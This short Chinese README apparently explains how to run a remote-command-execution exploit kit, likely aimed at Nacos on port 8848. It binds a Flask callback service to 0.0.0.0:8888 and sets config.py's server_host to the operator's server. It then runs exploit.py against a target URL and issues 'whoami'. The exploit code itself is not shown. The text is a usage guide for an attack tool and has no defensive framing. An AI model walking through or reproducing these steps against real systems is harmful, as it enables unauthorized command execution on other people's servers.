改动启动flask的ip+port为固定、输出post_json

```
app.run('0.0.0.0', 8888)
```

使用：

```
pip3 install -r requirements.txt
python3 service.py 启动flask服务
```

更改config.py中

![image-20240717105833683](/Users/mask/Library/Application Support/typora-user-images/image-20240717105833683.png)

```
server_host='服务器ip'
server_port无需更改
```

执行exploit.py：

```
python3 exploit.py
http://x.x.x.x:8848
whoami
```

